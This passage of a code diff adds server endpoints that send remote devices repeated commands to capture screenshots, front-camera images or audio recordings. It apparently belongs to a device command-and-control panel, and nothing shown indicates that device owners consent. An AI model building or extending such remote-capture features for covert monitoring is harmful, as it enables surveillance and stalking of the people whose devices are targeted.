+                    if device_id not in _jpeg_stream_info or not _jpeg_stream_info[device_id].get("active"):
+                        break
+                    await asyncio.sleep(1)
+        except asyncio.CancelledError:
+            pass
+        except Exception as e:
+            log.error("JPEG stream loop error for %s: %s", device_id, e)
+        finally:
+            log.info("JPEG stream loop ended: device=%s", device_id)
+
+    async def api_jpeg_stream_start(request):
+        """POST /api/stream/jpeg_start - Start JPEG screenshot streaming for a device."""
+        global api_hits
+        api_hits += 1
+        try:
+            body = await request.json()
+            device_id = body.get("device_id", "")
+            stream_type = body.get("type", "screen")
+            interval = body.get("interval", 3)
+
+            if not device_id:
+                return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+
+            d = find_device(device_id)
+            if not d:
+                return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+
+            # Stop existing stream for this device if any
+            if device_id in _jpeg_stream_info and _jpeg_stream_info[device_id].get("active"):
+                _jpeg_stream_info[device_id]["active"] = False
+                task = _jpeg_stream_tasks_module.get(device_id)
+                if task and not task.done():
+                    task.cancel()
+
+            # Set up stream info
+            _jpeg_stream_info[device_id] = {
+                "active": True,
+                "type": stream_type,
+                "interval": interval,
+                "started_at": time.time(),
+                "last_command_time": 0,
+                "last_frame_time": 0,
+                "frame_count": 0,
+            }
+
+            # Send the first screenshot command immediately
+            cmd_map = {"screen": "screenshot", "camera": "front_camera", "audio": "record_audio"}
+            queue_command(device_id, cmd_map.get(stream_type, "screenshot"))
+
+            # Start background loop
+            task = asyncio.create_task(_jpeg_stream_loop(device_id, stream_type, interval))
+            _jpeg_stream_tasks_module[device_id] = task
+
+            update_device(device_id, {"streaming": True})
+            append_event("JPEG stream started", {"device_id": device_id, "type": stream_type})
+            log.info("JPEG stream started: device=%s type=%s interval=%ds", device_id, stream_type, interval)
+
+            return web.json_response({"ok": True, "message": f"JPEG streaming started ({stream_type})"})
+        except Exception as exc:
+            log.error("jpeg_stream_start error: %s", exc)
+            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+    async def api_jpeg_stream_stop(request):
+        """POST /api/stream/jpeg_stop - Stop JPEG screenshot streaming for a device."""
+        global api_hits
+        api_hits += 1
+        try:
+            body = await request.json()
+            device_id = body.get("device_id", "")
+
+            if not device_id:
+                return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+
+            info = _jpeg_stream_info.get(device_id)
+            if info:
+                info["active"] = False
+                task = _jpeg_stream_tasks_module.get(device_id)
+                if task and not task.done():
+                    task.cancel()
+                del _jpeg_stream_tasks_module[device_id]
+                del _jpeg_stream_info[device_id]
+
+            # Also queue stop commands if it was an audio stream
+            if info and info.get("type") == "audio":
+                queue_command(device_id, "stop_audio_stream")
+
+            update_device(device_id, {"streaming": False})
+            # Clean cached frames
+            for key in list(_latest_frames_module.keys()):
+                if device_id in key:
+                    del _latest_frames_module[key]
+
+            append_event("JPEG stream stopped", {"device_id": device_id})
+            log.info("JPEG stream stopped: device=%s", device_id)
+
+            return web.json_response({"ok": True, "message": "JPEG streaming stopped"})
+        except Exception as exc:
+            log.error("jpeg_stream_stop error: %s", exc)
+            return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
     async def api_stream_start(request):
         """POST /api/stream/start - Receive stream start notification from device"""
@@ -3747,6 +4185,8 @@ def create_app():
     app.router.add_get("/api/stream/status", api_stream_status)
     app.router.add_post("/api/stream/start", api_stream_start)
     app.router.add_post("/api/stream/stop", api_stream_stop)
+    app.router.add_post("/api/stream/jpeg_start", api_jpeg_stream_start)
+    app.router.add_post("/api/stream/jpeg_stop", api_jpeg_stream_stop)
 
     # Static files
     static_dir = Path(__file__).parent / "static"
